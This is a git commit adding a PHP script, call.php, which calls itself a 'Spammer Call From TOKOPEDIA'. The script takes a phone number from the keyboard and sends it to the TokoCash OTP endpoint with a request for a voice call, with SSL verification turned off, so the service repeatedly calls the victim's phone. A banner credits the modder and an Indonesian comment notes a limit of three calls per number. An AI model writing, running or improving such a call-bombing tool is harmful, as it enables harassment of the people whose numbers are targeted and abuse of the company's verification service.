22a05f87257c3d4f79b2e9ee4fcd8b43bc367139
purindra <49579874+purindra@users.noreply.github.com>
2019-04-13 13:47:21 +0700

    Add files via upload

---
+++ call.php
@@ -0,0 +1,29 @@
+<?php
+// Limit 3x Telpon Setiap Satu Nomor
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "
+############################################################
+    Spammer Call From TOKOPEDIA
+    Mod By      : Gebang Kiidiw
+    Contact Me  : gebangkiidiw@gmail.com
+    Blog        : www.gebangkiidiw.com
+    Youtube     : Gebang Kiidiw
+    Instagram   : @Bang_Joss24
+    Thanks to   : SGB-TEAM
+    Penggunaan  : Awali Dengan Angka [62]
+############################################################\n";
+echo "Nomor\nInput : ";
+$nomor = trim(fgets(STDIN));
+$execute = send($nomor);
+print $execute;
+?>
